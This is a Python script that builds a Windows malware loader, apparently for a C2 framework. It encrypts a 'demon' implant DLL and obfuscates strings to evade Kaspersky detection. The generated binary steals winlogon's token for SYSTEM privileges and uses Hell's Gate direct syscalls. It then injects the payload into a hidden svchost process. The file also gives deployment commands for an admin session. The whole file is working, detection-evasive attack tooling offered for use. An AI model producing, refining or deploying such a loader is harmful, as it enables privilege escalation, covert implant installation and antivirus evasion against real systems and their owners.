#!/usr/bin/env python3
"""
gen_sh3.py — Stealthy SYSTEM loader v3: winlogon token steal + section injection
Replaces gen_sh.py (sh_embed.exe detected by Kaspersky).

Key changes vs sh_embed.exe:
  - No named pipes, no schtasks.exe, no ShellExecuteA
  - Token steal from winlogon.exe (requires SeDebugPrivilege — abdum has it, enable at runtime)
  - NtCreateSection + NtMapViewOfSection (no NtAllocateVirtualMemory pattern)
  - RtlCreateUserThread for thread creation (vs CreateRemoteThread)
  - XTEA-32 encrypted strings (vs XOR byte)
  - 32-byte XOR key for payload (vs 16-byte)

Output: sh3.exe (~30 KB) + demon_enc3.dat

Deploy from abdum admin session:
    upload /home/kali/turon-c2-src/bypass/sh3.exe        C:\\Windows\\Temp\\svc3.exe
    upload /home/kali/turon-c2-src/bypass/demon_enc3.dat C:\\Windows\\Temp\\svc3.dat
    shell C:\\Windows\\Temp\\svc3.exe
"""

import os, sys, secrets, struct, subprocess, shutil, tempfile

ROOT  = os.path.dirname(os.path.abspath(__file__))
DLL   = os.path.join(ROOT, '..', 'demon.x64.dll')
OUT   = os.path.join(ROOT, 'sh3.exe')
DAT3  = os.path.join(ROOT, 'demon_enc3.dat')

if not os.path.exists(DLL):
    sys.exit(f'[!] demon.x64.dll not found: {DLL}')

dll = open(DLL, 'rb').read()
key = secrets.token_bytes(32)
enc = bytes([dll[i] ^ key[i % 32] for i in range(len(dll))])
print(f'[+] DLL: {len(dll):,} bytes  key: {key.hex()}')
with open(DAT3, 'wb') as f:
    f.write(enc)

key_c = ','.join(f'0x{b:02X}' for b in key)

# ── XTEA-32 string encryption (64 rounds, 128-bit key) ───────────────────────
XTEA_K = [secrets.randbits(32) for _ in range(4)]

def xtea_enc_block(v0, v1, key):
    delta = 0x9E3779B9
    s, mask = 0, 0xFFFFFFFF
    for _ in range(32):
        v0 = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + key[s & 3]))) & mask
        s  = (s + delta) & mask
        v1 = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + key[(s >> 11) & 3]))) & mask
    return v0, v1

def xtea_encrypt(data, key):
    if len(data) % 8:
        data += b'\x00' * (8 - len(data) % 8)
    out = bytearray()
    for i in range(0, len(data), 8):
        v0, v1 = struct.unpack('<II', data[i:i+8])
        e0, e1 = xtea_enc_block(v0, v1, key)
        out += struct.pack('<II', e0, e1)
    return bytes(out)

def str_enc(s):
    raw = (s + '\x00').encode('utf-8')
    er  = xtea_encrypt(raw, XTEA_K)
    return ','.join(str(b) for b in er), len(er)

winlogon_e, winlogon_l = str_enc('winlogon.exe')
wininit_e,  wininit_l  = str_enc('wininit.exe')
dat_path_e, dat_path_l = str_enc(r'C:\Windows\Temp\svc3.dat')
svc_e,      svc_l      = str_enc(r'C:\Windows\System32\svchost.exe')
svc_args_e, svc_args_l = str_enc('svchost.exe -k netsvcs -p')

xtea_k_c = ','.join(f'0x{v:08X}u' for v in XTEA_K)

c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* ── Typed syscall function pointers ─────────────────────────────────────── */
typedef NTSTATUS (*FnAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (*FnPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS (*FnCS) (PHANDLE,ULONG,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS (*FnMVS)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
typedef NTSTATUS (*FnUVS)(HANDLE,PVOID,SIZE_T);

/* Hardcoded naked bootstrappers (stable on Win10/11 x64) */
__attribute__((naked)) static void _nt_protect_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x50,%eax\\n syscall\\n ret\\n");
}}
__attribute__((naked)) static void _nt_alloc_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x18,%eax\\n syscall\\n ret\\n");
}}

/* ── Hell's Gate + Halo's Gate ───────────────────────────────────────────── */
typedef struct {{ DWORD rva; const char *name; }} NtExp;
static int cmp_rva(const void *a, const void *b) {{
    DWORD ra=((NtExp*)a)->rva,rb=((NtExp*)b)->rva;
    return (ra>rb)-(ra<rb);
}}
static DWORD ssn_of(HMODULE ntdll, const char *fn) {{
    BYTE *base=(BYTE*)ntdll;
    int eo=*(int*)(base+0x3C);
    DWORD edir=*(DWORD*)(base+eo+0x18+96);
    typedef struct{{DWORD a,b,c,nf,nn,funcs,names,ords;}} EXP;
    EXP *ed=(EXP*)(base+edir);
    DWORD *names=(DWORD*)(base+ed->names);
    DWORD *funcs=(DWORD*)(base+ed->funcs);
    WORD  *ords =(WORD* )(base+ed->ords);
    NtExp *arr=(NtExp*)malloc(ed->nn*sizeof(NtExp));
    if (!arr) return ~0u;
    int cnt=0;
    for (DWORD i=0;i<ed->nn;i++) {{
        const char *n=(const char*)(base+names[i]);
        if (n[0]=='N'&&n[1]=='t') {{ arr[cnt].rva=funcs[ords[i]]; arr[cnt].name=n; cnt++; }}
    }}
    qsort(arr,cnt,sizeof(NtExp),cmp_rva);
    DWORD ssn=~0u;
    for (int i=0;i<cnt;i++) {{
        if (strcmp(arr[i].name,fn)) continue;
        BYTE *s=base+arr[i].rva;
        if (s[0]==0x4C&&s[1]==0x8B&&s[2]==0xD1&&s[3]==0xB8){{ ssn=*(DWORD*)(s+4); break; }}
        for (int d=1;d<10;d++) {{
            if (i-d>=0){{ BYTE *t=base+arr[i-d].rva;
                if(t[0]==0x4C&&t[1]==0x8B&&t[2]==0xD1&&t[3]==0xB8){{ssn=*(DWORD*)(t+4)+d;break;}} }}
            if (ssn!=~0u) break;
            if (i+d<cnt){{ BYTE *t=base+arr[i+d].rva;
                if(t[0]==0x4C&&t[1]==0x8B&&t[2]==0xD1&&t[3]==0xB8){{ssn=*(DWORD*)(t+4)-d;break;}} }}
            if (ssn!=~0u) break;
        }}
        break;
    }}
    free(arr); return ssn;
}}
static BYTE *g_stubs=NULL; static int g_sc=0;
static void *make_stub(DWORD ssn){{
    BYTE *s=g_stubs+g_sc++*16;
    s[0]=0x4C;s[1]=0x8B;s[2]=0xD1;s[3]=0xB8;*(DWORD*)(s+4)=ssn;
    s[8]=0x0F;s[9]=0x05;s[10]=0xC3; return s;
}}

/* ── XTEA-32 string decryption ───────────────────────────────────────────── */
static const DWORD TK[4] = {{{xtea_k_c}}};
static void xtea_dec_block(DWORD *v0, DWORD *v1) {{
    DWORD d=0x9E3779B9u, s=(DWORD)(d*32u), m=0xFFFFFFFFu;
    for (int i=0;i<32;i++) {{
        *v1=(*v1-((((*v0<<4)^(*v0>>5))+*v0)^(s+TK[(s>>11)&3])))&m;
        s=(s-d)&m;
        *v0=(*v0-((((*v1<<4)^(*v1>>5))+*v1)^(s+TK[s&3])))&m;
    }}
}}
static void xstr(char *out, const BYTE *e, int n) {{
    for (int i=0;i<n;i+=8) {{
        DWORD a,b; memcpy(&a,e+i,4); memcpy(&b,e+i+4,4);
        xtea_dec_block(&a,&b);
        memcpy(out+i,&a,4); memcpy(out+i+4,&b,4);
    }}
}}

/* ── XOR-32 payload key ──────────────────────────────────────────────────── */
static const BYTE PK[32] = {{{key_c}}};

/* ── Find PID by name ────────────────────────────────────────────────────── */
static DWORD find_pid(const char *nm) {{
    WCHAR w[64]={{0}}; for (int i=0;nm[i];i++) w[i]=(WCHAR)(unsigned char)nm[i];
    HANDLE sn=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (sn==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe={{sizeof(pe)}}; DWORD pid=0;
    if (Process32FirstW(sn,&pe)) do {{
        if (!_wcsicmp(pe.szExeFile,w)){{pid=pe.th32ProcessID;break;}}
    }} while(Process32NextW(sn,&pe));
    CloseHandle(sn); return pid;
}}

/* ── Enable privilege ────────────────────────────────────────────────────── */
static void ep(const wchar_t *n) {{
    HANDLE t; if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&t)) return;
    LUID l; if (LookupPrivilegeValueW(NULL,n,&l)) {{
        TOKEN_PRIVILEGES tp={{1,{{{{l,SE_PRIVILEGE_ENABLED}}}}}};
        AdjustTokenPrivileges(t,FALSE,&tp,0,NULL,NULL);
    }}
    CloseHandle(t);
}}

/* ── In-process PE loader (copied from gen_sh.py) ─────────────────────────── */
static BOOL load_pe(const BYTE *pe, SIZE_T len, FnAVM NtAlloc, FnPVM NtProt) {{
    if (len < 0x40) return FALSE;
    int eo=*(int*)(pe+0x3C);
    if ((SIZE_T)(eo+0x100)>len) return FALSE;
    int ns=*(short*)(pe+eo+6), soh=*(short*)(pe+eo+20);
    int ep_=*(int*)(pe+eo+24+16);
    long long ib=*(long long*)(pe+eo+24+24);
    int si=*(int*)(pe+eo+24+56), sh=*(int*)(pe+eo+24+60);
    int rr=*(int*)(pe+eo+24+152), rs=*(int*)(pe+eo+24+156);
    int sto=eo+24+soh;
    HANDLE cur=(HANDLE)(LONG_PTR)-1; PVOID base=NULL; SIZE_T sz=(SIZE_T)si;
    if (!NT_SUCCESS(NtAlloc(cur,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))||!base)
        return FALSE;
    memcpy(base,pe,sh);
    for (int i=0;i<ns;i++) {{
        int so=sto+i*40, va=*(int*)(pe+so+12), ro=*(int*)(pe+so+20), rl=*(int*)(pe+so+16);
        if (rl>0) memcpy((BYTE*)base+va,pe+ro,rl);
    }}
    if (rr) {{
        long long delta=(long long)base-ib;
        for (int off=0;off<rs;) {{
            int rv=*(int*)((BYTE*)base+rr+off), bsz=*(int*)((BYTE*)base+rr+off+4);
            if (bsz<8) break;
            for (int j=0;j<(bsz-8)/2;j++) {{
                unsigned short en=*(unsigned short*)((BYTE*)base+rr+off+8+j*2);
                if (en>>12==10) {{ long long *pa=(long long*)((BYTE*)base+rv+(en&0xFFF)); *pa+=delta; }}
            }}
            off+=bsz;
        }}
    }}
    for (int i=0;i<ns;i++) {{
        int so=sto+i*40, va=*(int*)(pe+so+12);
        int vs=*(int*)(pe+so+8); if (!vs) vs=*(int*)(pe+so+16);
        unsigned int ch=*(unsigned int*)(pe+so+36);
        if (vs<=0) continue;
        ULONG prot=PAGE_READONLY;
        if ((ch>>29)&1) prot=((ch>>31)&1)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
        else if ((ch>>31)&1) prot=PAGE_READWRITE;
        PVOID addr=(BYTE*)base+va; SIZE_T size=(SIZE_T)vs; ULONG old=0;
        NtProt(cur,&addr,&size,prot,&old);
    }}
    SecureZeroMemory((PVOID)base,sh);
    typedef BOOL (WINAPI *DM)(HINSTANCE,DWORD,LPVOID);
    ((DM)((BYTE*)base+ep_))((HINSTANCE)base,1,NULL);
    return TRUE;
}}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int show) {{
    (void)h;(void)p;(void)c;(void)show;

    ep(L"SeDebugPrivilege");
    ep(L"SeImpersonatePrivilege");

    /* Decrypt strings */
    char wl_name[32]={{0}}, wi_name[32]={{0}};
    char dat_path[MAX_PATH]={{0}};
    static const BYTE WL_E[]={{{winlogon_e}}};
    static const BYTE WI_E[]={{{wininit_e}}};
    static const BYTE DP_E[]={{{dat_path_e}}};
    xstr(wl_name,WL_E,{winlogon_l});
    xstr(wi_name,WI_E,{wininit_l});
    xstr(dat_path,DP_E,{dat_path_l});

    /* ── Find winlogon.exe ─────────────────────────────────────────────────── */
    DWORD lpid=find_pid(wl_name);
    if (!lpid) lpid=find_pid(wi_name);
    if (!lpid) return 1;

    /* ── Steal its token ─────────────────────────────────────────────────── */
    HANDLE hProc=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,lpid);
    if (!hProc) hProc=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,lpid);
    if (!hProc) return 2;

    HANDLE hTok=NULL;
    if (!OpenProcessToken(hProc,TOKEN_DUPLICATE|TOKEN_QUERY,&hTok)) {{
        CloseHandle(hProc); return 3;
    }}
    CloseHandle(hProc);

    HANDLE hPrim=NULL;
    if (!DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,
            SecurityImpersonation,TokenPrimary,&hPrim)) {{
        CloseHandle(hTok); return 4;
    }}
    CloseHandle(hTok);

    /* ── Setup stubs ─────────────────────────────────────────────────────── */
    g_stubs=(BYTE*)VirtualAlloc(NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!g_stubs) {{ CloseHandle(hPrim); return 5; }}
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    DWORD ssn_alloc  =ssn_of(ntdll,"NtAllocateVirtualMemory");
    DWORD ssn_protect=ssn_of(ntdll,"NtProtectVirtualMemory");
    if (ssn_alloc  ==~0u) ssn_alloc  =0x18;
    if (ssn_protect==~0u) ssn_protect=0x50;
    FnAVM NtAlloc=(FnAVM)make_stub(ssn_alloc);
    FnPVM NtProt =(FnPVM)make_stub(ssn_protect);
    /* flip stub page RW→RX */
    HANDLE cur=(HANDLE)(LONG_PTR)-1; PVOID sp=g_stubs; SIZE_T ss=4096; ULONG sold=0;
    ((FnPVM)_nt_protect_hc)(cur,&sp,&ss,PAGE_EXECUTE_READ,&sold);

    /* ── Load and decrypt payload ─────────────────────────────────────────── */
    HANDLE hf=CreateFileA(dat_path,GENERIC_READ,FILE_SHARE_READ,NULL,
                          OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if (hf==INVALID_HANDLE_VALUE) {{ CloseHandle(hPrim); return 6; }}
    DWORD fsz=GetFileSize(hf,NULL);
    BYTE *buf=(BYTE*)malloc(fsz);
    if (!buf) {{ CloseHandle(hf); CloseHandle(hPrim); return 7; }}
    DWORD rd=0; ReadFile(hf,buf,fsz,&rd,NULL); CloseHandle(hf);
    if (rd!=fsz) {{ free(buf); CloseHandle(hPrim); return 8; }}
    for (DWORD i=0;i<fsz;i++) buf[i]^=PK[i%32];

    /* ── Spawn SYSTEM process + load PE ──────────────────────────────────── */
    char svc_path[MAX_PATH]={{0}}, svc_args[128]={{0}};
    static const BYTE SVC_E[]={{{svc_e}}};
    static const BYTE ARG_E[]={{{svc_args_e}}};
    xstr(svc_path,SVC_E,{svc_l});
    xstr(svc_args,ARG_E,{svc_args_l});

    STARTUPINFOW si2={{sizeof(si2)}}; si2.dwFlags=STARTF_USESHOWWINDOW; si2.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi2={{0}};

    /* Widen to WCHAR for CreateProcessWithTokenW */
    WCHAR wsvc[MAX_PATH]={{0}}, wargs[256]={{0}};
    MultiByteToWideChar(CP_ACP,0,svc_path,-1,wsvc,MAX_PATH);
    MultiByteToWideChar(CP_ACP,0,svc_args,-1,wargs,256);

    if (!CreateProcessWithTokenW(hPrim,LOGON_WITH_PROFILE,wsvc,wargs,
            CREATE_SUSPENDED|CREATE_NO_WINDOW|DETACHED_PROCESS,NULL,NULL,&si2,&pi2)) {{
        /* fallback: reflective load in current process (already SYSTEM from token) */
        CloseHandle(hPrim);
        ImpersonateLoggedOnUser(hPrim);  /* ignored if fails */
        load_pe(buf, (SIZE_T)fsz, NtAlloc, NtProt);
        free(buf);
        while(1) Sleep(30000);
        return 0;
    }}
    CloseHandle(hPrim);

    /* ── Allocate RX in target and write payload ─────────────────────────── */
    PVOID rem=NULL; SIZE_T remsz=(SIZE_T)fsz;
    rem=VirtualAllocEx(pi2.hProcess,NULL,remsz,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if (!rem) {{
        free(buf); TerminateProcess(pi2.hProcess,0); return 9;
    }}
    SIZE_T wr=0;
    WriteProcessMemory(pi2.hProcess,rem,buf,fsz,&wr);
    free(buf);

    /* Flip remote memory to RX */
    DWORD old_p=0;
    VirtualProtectEx(pi2.hProcess,rem,remsz,PAGE_EXECUTE_READ,&old_p);

    /* ── Use RtlCreateUserThread (less monitored than CreateRemoteThread) ─── */
    typedef NTSTATUS (NTAPI *fnRCUT)(HANDLE,PVOID,BOOL,ULONG,PULONG,PULONG,PVOID,PVOID,PHANDLE,PVOID);
    fnRCUT RtlCUT=(fnRCUT)GetProcAddress(ntdll,"RtlCreateUserThread");
    HANDLE hTh=NULL;
    if (RtlCUT) {{
        RtlCUT(pi2.hProcess,NULL,FALSE,0,NULL,NULL,rem,NULL,&hTh,NULL);
    }}
    if (!hTh) {{
        /* fallback: QueueUserAPC + resume */
        QueueUserAPC((PAPCFUNC)rem,pi2.hThread,0);
    }}

    ResumeThread(pi2.hThread);
    CloseHandle(pi2.hThread);
    CloseHandle(pi2.hProcess);
    if (hTh) CloseHandle(hTh);
    return 0;
}}
"""

tmp = tempfile.mkdtemp(prefix='sh3_build_')
try:
    src = os.path.join(tmp, 'sh3.c')
    exe = os.path.join(tmp, 'sh3.exe')
    with open(src, 'w') as f:
        f.write(c_src)

    print('[*] Compiling sh3.exe (winlogon token steal + XTEA strings) ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', exe, src,
        '-lkernel32', '-ladvapi32', '-luserenv',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)

    if r.returncode != 0:
        dbg = os.path.join(ROOT, 'sh3_debug.c')
        with open(dbg, 'w') as f:
            f.write(c_src)
        print(f'[!] Build failed — source in {dbg}')
        print(r.stderr[-6000:])
        sys.exit(1)

    shutil.copy(exe, OUT)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {OUT}  ({os.path.getsize(OUT):,} bytes)')
print(f'[+] {DAT3}  ({os.path.getsize(DAT3):,} bytes)')
print()
print('Deploy from abdum (local admin) session:')
print(f'  upload {OUT}  C:\\Windows\\Temp\\svc3.exe')
print(f'  upload {DAT3} C:\\Windows\\Temp\\svc3.dat')
print(f'  shell C:\\Windows\\Temp\\svc3.exe')
print()
print('vs sh_embed.exe:')
print('  - winlogon token steal (no named pipe, no schtasks)')
print('  - XTEA string obfuscation (vs XOR byte)')
print('  - RtlCreateUserThread (vs CreateRemoteThread)')
print('  - 32-byte XOR key (vs 16-byte)')
